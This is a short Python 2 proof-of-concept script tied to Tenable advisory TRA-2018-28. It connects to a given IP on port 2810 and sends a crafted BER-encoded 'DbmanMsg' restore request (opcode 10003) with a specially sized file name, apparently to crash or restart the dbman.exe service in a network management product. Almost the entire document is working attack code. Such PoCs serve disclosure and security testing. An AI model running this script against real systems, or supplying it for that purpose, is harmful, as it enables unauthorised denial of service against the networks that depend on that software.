from pyasn1.type.univ import *
from pyasn1.type.namedtype import *
from pyasn1.codec.ber import encoder
import struct
import binascii
import socket, sys

# http://tenable.com/security/research/tra-2018-28

def print_usage():
    print "Usage: python " + sys.argv[0] + " <ip> [port=2810]"
    sys.exit(0)

port = 2810	# default
opcode = 10003

num_args = len(sys.argv)
if num_args < 2 or num_args > 3:
    print_usage()

ip = sys.argv[1]
if num_args == 3:
    try:
        port = int(sys.argv[2])
    except:
        print "Invalid port number."
        print_usage()

print "Running PoC against " + ip + ":" + str(port)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((ip, port))

class RestoreItem(Sequence):
    componentType = NamedTypes(
        NamedType('fileName', OctetString()),
        NamedType('ipAddress', OctetString())
    )

class FileList(SequenceOf):
    componentType = RestoreItem()

class DbmanMsg(Sequence):
    componentType = NamedTypes(
        NamedType('fileList', FileList()),
        NamedType('manualRestoreType', Integer()),
        NamedType('ifRestartImc', Integer())
    )

msg = DbmanMsg()
msg['manualRestoreType'] = 1
msg['ifRestartImc'] = 1

restoreItem = RestoreItem()
name = "1234567890123456789" # 19 len
restoreItem['fileName'] = "C:\\" + name + ".db"
restoreItem['ipAddress'] = ""

fileList = FileList()
fileList[0] = restoreItem

msg['fileList'] = fileList

print 'Sent the following:'
print msg


encodedMsg = encoder.encode(msg, defMode=True)
msgLen = len(encodedMsg)
values = (opcode, msgLen, encodedMsg)
s = struct.Struct(">ii%ds" % msgLen)
packed_data = s.pack(*values)

sock.send(packed_data)
sock.close()

print "Done."
print "Did dbman.exe restart?"
